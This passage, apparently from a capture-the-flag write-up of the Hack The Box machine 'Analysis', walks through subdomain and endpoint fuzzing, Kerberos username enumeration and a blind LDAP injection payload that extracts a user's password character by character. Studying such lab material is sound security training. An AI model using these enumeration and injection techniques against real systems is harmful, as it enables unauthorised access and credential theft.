|       namingContexts: &lt;span class=&quot;nv&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;DomainDnsZones,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;analysis,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
|       namingContexts: &lt;span class=&quot;nv&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ForestDnsZones,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;analysis,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
|       isSynchronized: TRUE
|       highestCommittedUSN: 377005
|       dsServiceName: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;NTDS Settings,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;DC-ANALYSIS,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Servers,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Default-First-Site-Name,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Sites,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;analysis,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
|       dnsHostName: DC-ANALYSIS.analysis.htb
|       defaultNamingContext: &lt;span class=&quot;nv&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;analysis,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
|       currentTime: 20240122225140.0Z
|_      configurationNamingContext: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;analysis,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, the DC for this is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;analysis.htb&lt;/code&gt;. Maybe the reason why the browser was not able to fetch the website through the IP address is because this domain name must be added to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;. Let’s add it to the with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo vim /etc/hosts&lt;/code&gt; and add &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;machine-ip&amp;gt; analysis.htb&lt;/code&gt; at the end of the file. After that, let’s try to access the webpage again:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/analysis01.png&quot; alt=&quot;analysis homepage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Alright! This seems like a nice website. However, I have not found anything useful within the page or DOM, so I decided to enumerate it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt;. Without any success, I tried to move on to another enumeration method. Since port 53 is open, we might be able to find subdomains associated with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;analysis.htb&lt;/code&gt; name service. For that, I’ve ran &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; with the DNS flag:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster dns &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; analysis.htb &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; analysis.htb:53
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
Gobuster v3.6
by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@firefart&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Domain:     analysis.htb
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:    10
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Resolver:   analysis.htb:53
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:    1s
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:   /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
Starting gobuster &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;DNS enumeration mode
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
Found: www.analysis.htb

Found: internal.analysis.htb

Found: gc._msdcs.analysis.htb

Found: domaindnszones.analysis.htb

Found: forestdnszones.analysis.htb
                                                                                                  
Progress: 19966 / 19967 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;99.99%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
Finished
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, there are some subdomains available for us. Before trying to access them, we must add them to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file like this: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;machine-ip&amp;gt; analysis.htb internal.analysis.htb domaindnszones.analysis.htb forestdnszones.analysis.htb ...&lt;/code&gt;. After that, let’s examine &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;internal.analysis.htb&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/analysis02.png&quot; alt=&quot;internal homepage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, this page is unreachable for now. But that does not mean we are not able to enumerate this subdomain for other endpoints. For that reason, I decided to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt; to find possible endpoints:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://internal.analysis.htb/FUZZ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-1.0.txt 

        /&lt;span class=&quot;s1&quot;&gt;&apos;___\  /&apos;&lt;/span&gt;___&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;          /&lt;span class=&quot;s1&quot;&gt;&apos;___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-1.0.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

Users                   [Status: 301, Size: 170, Words: 9, Lines: 2, Duration: 136ms]
dashboard               [Status: 301, Size: 174, Words: 9, Lines: 2, Duration: 139ms]
\                       [Status: 403, Size: 1268, Words: 74, Lines: 30, Duration: 149ms]
employees               [Status: 301, Size: 174, Words: 9, Lines: 2, Duration: 135ms]
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, there are some interesting endpoints that might have hidden ways in the web-service. After some failed attempts, I decided to append &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.php&lt;/code&gt; extension at the end of the endpoints and got some interesting results. Starting with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Users/&lt;/code&gt; endpoint, we have:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://internal.analysis.htb/users/FUZZ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-1.0.txt &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; .php

        /&lt;span class=&quot;s1&quot;&gt;&apos;___\  /&apos;&lt;/span&gt;___&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;          /&lt;span class=&quot;s1&quot;&gt;&apos;___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/users/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-1.0.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

list.php                [Status: 200, Size: 17, Words: 2, Lines: 1, Duration: 173ms]
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Accessing the page, we have:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/analysis-internal1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It seems the page is expecting a GET parameter in the request. For that, we will try to find what is the correct parameter with a bash script:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;WORDLIST_PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/usr/share/wordlists/seclists/Discovery/Web-Content/url-params_from-top-55-most-popular-apps.txt&quot;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WORDLIST_PATH&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Wordlist file does not exist at &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WORDLIST_PATH&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;1
&lt;span class=&quot;k&quot;&gt;fi

while &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;IFS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; line&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Testing parameter name &apos;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&apos;...&quot;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://internal.analysis.htb/Users/list.php?&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;missing parameter&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
                &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Parameter found: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
                &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;0
        &lt;span class=&quot;k&quot;&gt;fi
done&lt;/span&gt; &amp;lt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WORDLIST_PATH&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This will loke for different responses by passing different parameter names to it. After running it, we find that the parameter name is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./find-param.sh
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;embedded&apos;&lt;/span&gt;...
Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;enc_user&apos;&lt;/span&gt;...
Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;f&apos;&lt;/span&gt;...
Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;fiatId&apos;&lt;/span&gt;...
Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;format&apos;&lt;/span&gt;...
Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;full_text&apos;&lt;/span&gt;...
Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;href&apos;&lt;/span&gt;...
Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;id&apos;&lt;/span&gt;...
Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;id_type&apos;&lt;/span&gt;...
Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;include&apos;&lt;/span&gt;...
Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;k4&apos;&lt;/span&gt;...
Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;k&apos;&lt;/span&gt;...
Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;keyURL&apos;&lt;/span&gt;...
Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;language&apos;&lt;/span&gt;...
Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;limit&apos;&lt;/span&gt;...
Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;list&apos;&lt;/span&gt;...
Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;list_id&apos;&lt;/span&gt;...
Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;lon&apos;&lt;/span&gt;...
Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;m4&apos;&lt;/span&gt;...
Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;name&apos;&lt;/span&gt;...
Parameter found: name
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Accessing the page, we find this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/analysis03.png&quot; alt=&quot;parameter name on list.php&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After poking around with this parameter, I’ve got nowhere. So I decided to move on to another endpoint. Since the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dashboard&lt;/code&gt; endpoint is giving us Access Denied, let’s enumerate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/employees&lt;/code&gt; endpoint with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://internal.analysis.htb/employees/FUZZ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-1.0.txt &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; .php   

        /&lt;span class=&quot;s1&quot;&gt;&apos;___\  /&apos;&lt;/span&gt;___&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;          /&lt;span class=&quot;s1&quot;&gt;&apos;___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/employees/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-1.0.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

login.php               [Status: 200, Size: 1085, Words: 413, Lines: 30, Duration: 182ms]
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And we found a login page!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/analysis04.png&quot; alt=&quot;login page&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ok, so we need a pair of credentials to login. Let’s move to another service and see if we can leak something useful. Note that we have Kerberos running, which means we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kerbrute&lt;/code&gt; to find valid emails. The internal emails used here must be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@analysis.htb&lt;/code&gt;. Let’s run:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt possible-usernames.txt | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;s|&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;@analysis.htb|&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; emails-wl.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, we run kerbrute:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;kerbrute userenum &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; analysis.htb emails-wl.txt &lt;span class=&quot;nt&quot;&gt;--dc&lt;/span&gt; analysis.htb
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt; ___/ __ &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt; ___/ / / / __/ _ &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 / ,&amp;lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__/_/  /_.___/_/   &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_,_/&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_/&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__/                                        

Version: v1.0.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;9dad6e1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - 01/22/24 - Ronnie Flathers @ropnop

2024/01/22 20:37:53 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  Using KDC&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
2024/01/22 20:37:53 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;   analysis.htb:88

2024/01/22 20:39:23 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       jdoe@analysis.htb
2024/01/22 20:40:45 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       ajohnson@analysis.htb
2024/01/22 20:43:40 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       cwilliams@analysis.htb
2024/01/22 20:45:00 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       wsmith@analysis.htb
2024/01/22 20:49:41 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       jangel@analysis.htb
2024/01/22 21:10:10 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       technician@analysis.htb
2024/01/22 21:28:24 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       JDoe@analysis.htb
2024/01/22 21:29:38 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       AJohnson@analysis.htb
2024/01/22 22:50:34 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       badam@analysis.htb

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, there are a bunch of valid usernames. Let’s go back to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Users&lt;/code&gt; endpoint and pass these usernames (without the mail part &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@analysis.htb&lt;/code&gt;) and see if we can retrieve someone’s password. After a bunch of attempts, we see that the name &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;technician&lt;/code&gt; under the email &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;technician@analysis.htb&lt;/code&gt; gives a different response:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/analysis05.png&quot; alt=&quot;valid user&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, nothing too much interesting shows up here. We could try to brute the password using kerbrute, but I’ve tried it with huge wordlists and nothing was found. There must be another way to get this user’s password…&lt;/p&gt;

&lt;p&gt;I’ve tried to send SQL injection payloads, but without success. Then, after a long time of researching, I’ve found (and learned) this new injection technique: LDAP injections. Some web applications serve as bridges to LDAP service, and they can also be prone to injection! I came across &lt;a href=&quot;https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_FUZZ.txt&quot;&gt;this&lt;/a&gt; wordlist, which contained different kinds of payloads. The first one, a simple asterisk &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*&lt;/code&gt;, showed that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name&lt;/code&gt; parameter was indeed used to query LDAP:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/analysis1.png&quot; alt=&quot;ldap injection test&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After a bit more research, I found that the payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name=&amp;lt;username&amp;gt;)(%26(objectClass=user)(description=*)&lt;/code&gt; can be used to enumerate the possible characters of the user’s password. All we need to do is pass characters at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(description=&amp;lt;pwd-char&amp;gt;*)&lt;/code&gt;. If the character is a correct guess, then the page would return the same as if we pass &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name=&amp;lt;username&amp;gt;&lt;/code&gt; alone. This is a blind LDAP injection attack, as we have to guess without actually having the password to be printed out for us in the body of the page.&lt;/p&gt;

&lt;p&gt;As an example, let’s see the following response for the payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name=technician)(%26(objectClass=user)(description=9*)&lt;/code&gt; against &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name=technician)(%26(objectClass=user)(description=7*)&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/analysis07.png&quot; alt=&quot;invalid payload&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/analysis06.png&quot; alt=&quot;valid payload&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, because we got a response back with the First Name field containing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;technician&lt;/code&gt; when we passed the 9 instead of 7, we conclude that the number 9 is the first character of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;technician&lt;/code&gt; user!&lt;/p&gt;

&lt;p&gt;Alright, let’s automate the character testing process using a Python script. However, there’s a catch: the asterisk character &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*&lt;/code&gt; holds a special meaning in LDAP queries, representing a wildcard. This presents a challenge if the character is part of the password, as our query may not interpret it correctly. For instance, if the password is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;abc\*123\*!@#&lt;/code&gt;, our script can correctly guess up to abc, but it will struggle to identify the * due to its special significance in LDAP. To address this, the script operates in rounds. It tests characters sequentially until it exhausts its list. If it can’t progress further, the script attempts a login, assuming the next character might be an asterisk. If the login fails, it confirms the presence of a * and proceeds to the next round. This process repeats until the script successfully deduces the entire password. The script is available &lt;a href=&quot;https://github.com/alexbsec/analysis-htb/blob/master/ldapinject.py&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib.parse&lt;/span&gt;
